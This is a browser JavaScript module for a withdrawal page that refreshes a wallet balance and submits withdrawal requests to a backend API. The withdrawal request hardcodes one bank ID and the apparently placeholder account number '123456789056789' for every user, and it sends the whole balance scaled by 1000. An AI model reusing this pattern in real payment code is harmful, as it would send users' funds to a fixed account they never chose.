(function () {
  const normalizeBalance = (value) => {
    if (value === null || value === undefined) return 0;
    if (typeof value === "number") {
      return Number.isFinite(value) ? value : 0;
    }
    if (typeof value === "string") {
      const cleaned = value.replace(/,/g, "").trim();
      const numeric = Number(cleaned);
      return Number.isFinite(numeric) ? numeric : 0;
    }
    const numeric = Number(value);
    return Number.isFinite(numeric) ? numeric : 0;
  };

  const safeParseUser = () => {
    try {
      return JSON.parse(localStorage.getItem("user") || "{}");
    } catch (_error) {
      return {};
    }
  };

  const resolveBalanceFromStorage = () => {
    const stored = localStorage.getItem("balance");
    if (stored === null || stored === undefined) return null;
    const numeric = normalizeBalance(stored);
    return Number.isFinite(numeric) ? numeric : null;
  };

  const createOverlay = () => {
    const wrapper = document.createElement("div");
    wrapper.className = "m-withdrawal-overlay";
    wrapper.innerHTML =
      '<div class="spinner"></div><span class="overlay-text">Processing...</span>';
    return wrapper;
  };

  const init = () => {
    const container = document.querySelector(".m-withdrawal-audit");
    if (!container) return;

    const reloadButton = container.querySelector(".countdown-reload");
    const withdrawButton = container.querySelector(".setting-btn");
    const dataContainer = container.querySelector(".content-block .data");

    let overlay = createOverlay();
    let overlayTimeout = null;
    let isReloading = false;
    let isSubmitting = false;

    const overlayText = () => overlay.querySelector(".overlay-text");

    const showOverlay = (message) => {
      if (getComputedStyle(container).position === "static") {
        container.style.position = "relative";
      }
      if (overlay.parentNode !== container) {
        container.appendChild(overlay);
      }
      if (overlayText()) {
        overlayText().textContent = message || "Processing...";
      }
      if (overlayTimeout) {
        clearTimeout(overlayTimeout);
        overlayTimeout = null;
      }
    };

    const hideOverlay = (delay = 0) => {
      if (overlayTimeout) {
        clearTimeout(overlayTimeout);
      }
      overlayTimeout = window.setTimeout(() => {
        if (overlay.parentNode === container) {
          container.removeChild(overlay);
        }
        overlayTimeout = null;
      }, delay);
    };

    const formatBalance = (value) =>
      normalizeBalance(value).toLocaleString("en-US", {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2,
      });

    const updateBalanceDisplay = (balance) => {
      const normalized = normalizeBalance(balance);
      const formatted = formatBalance(normalized);
      if (dataContainer) {
        dataContainer.innerHTML = `
          <div class="mobile-withdraw-balance">
            <strong>Balance:</strong> ${formatted}
          </div>
        `;
      }
      try {
        localStorage.setItem("balance", String(normalized));
      } catch (_error) {
        /* ignore quota errors */
      }
      return formatted;
    };

    const fetchLatestWallet = async () => {
      await callSeamlessWallet();
      
      if (typeof APIUser === "function") {
        try {
          await APIUser();
        } catch (error) {
          console.warn("Unable to fetch user data:", error);
        }
      }
      
      let walletData = null;
      if (typeof seamlessWithdraw === "function") {
        try {
          walletData = await seamlessWithdraw();
        } catch (error) {
          console.warn("Unable to fetch seamless wallet:", error);
        }
      }

      const fallbackUser = safeParseUser();
      const fallbackBalance = resolveBalanceFromStorage();

      const balance =
        (walletData &&
          normalizeBalance(
            walletData.balance ??
              walletData.total_balance ??
              walletData.wallet_balance
          )) ||
        fallbackBalance ||
        normalizeBalance(fallbackUser.balance ?? fallbackUser.wallet_balance);

      if (walletData) {
        try {
          const mergedUser = { ...fallbackUser, seamlessWallet: walletData };
          localStorage.setItem("user", JSON.stringify(mergedUser));
        } catch (_error) {
          /* ignore storage errors */
        }
      }

      return balance;
    };

    const callSeamlessWallet = async () => {
      const token = localStorage.getItem("token");
      if (!token || typeof fetchBaseURL !== "function") {
        return;
      }

      const storedUser = safeParseUser();
      const seamlessEnabled = storedUser?.seamless?.isTransfer;
      if (!seamlessEnabled) {
        return;
      }

      try {
        const baseUrl = await fetchBaseURL();
        await fetch(`${baseUrl}/api/player/points/withdraw/seamless`, {
          method: "POST",
          headers: {
            Authorization: `Bearer ${token}`,
            Accept: "application/json",
          },
        });
      } catch (error) {
        console.warn("Seamless wallet sync failed:", error);
      }
    };

    const refreshBalance = async () => {
      const balance = await fetchLatestWallet();
      updateBalanceDisplay(balance);
      return balance;
    };

    const submitWithdrawal = async () => {
      if (typeof fetchBaseURL !== "function") {
        throw new Error("Unable to resolve API endpoint.");
      }

      const token = localStorage.getItem("token");
      if (!token) {
        throw new Error("Please login to submit a withdrawal request.");
      }

      const baseUrl = await fetchBaseURL();
      if (!baseUrl) {
        throw new Error("Unable to resolve API endpoint.");
      }

      const balance = await fetchLatestWallet();
      if (!balance || balance <= 0) {
        throw new Error("No available balance to withdraw.");
      }

      const transactionAmount = Math.round(balance * 1000);
      if (!transactionAmount) {
        throw new Error("No available balance to withdraw.");
      }

      const payload = {
        bank_id: 2944,
        transaction_amount: transactionAmount,
        bank_account_number: "123456789056789",
      };

      const response = await fetch(`${baseUrl}/api/account/withdraw`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify(payload),
      });

      let data = null;
      try {
        data = await response.clone().json();
      } catch (_error) {
        /* ignore parsing errors */
      }

      if (!response.ok) {
        const message =
          (data && (data.message || data.error)) ||
          "Withdrawal request failed. Please try again.";
        throw new Error(message);
      }
    };

    if (reloadButton) {
      reloadButton.style.cursor = "pointer";
      reloadButton.setAttribute("role", "button");
      reloadButton.setAttribute("tabindex", "0");
      const handleReload = async () => {
        if (isReloading) return;
        isReloading = true;
        showOverlay("Refreshing balance...");
        try {
          await refreshBalance();
        } catch (error) {
          console.error("Reload balance error:", error);
        } finally {
          hideOverlay(800);
          isReloading = false;
        }
      };
      reloadButton.addEventListener("click", handleReload);
      reloadButton.addEventListener("keydown", (event) => {
        if (event.key === "Enter" || event.key === " ") {
          event.preventDefault();
          handleReload();
        }
      });
    }

    if (withdrawButton) {
      withdrawButton.style.cursor = "pointer";
      const handleWithdraw = async () => {
        if (isSubmitting) return;
        isSubmitting = true;
        showOverlay("Submitting request...");
        try {
          await submitWithdrawal();
          alert(
            "Your request is submitted please wait for it to get for confirmation"
          );
          await refreshBalance();
        } catch (error) {
          console.error("Withdrawal submission error:", error);
          alert(error.message || "Withdrawal failed. Please try again later.");
        } finally {
          hideOverlay(800);
          isSubmitting = false;
        }
      };
      withdrawButton.addEventListener("click", handleWithdraw);
    }

    refreshBalance().catch((error) =>
      console.warn("Initial balance fetch failed:", error)
    );
  };

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init, { once: true });
  } else {
    init();
  }
})();







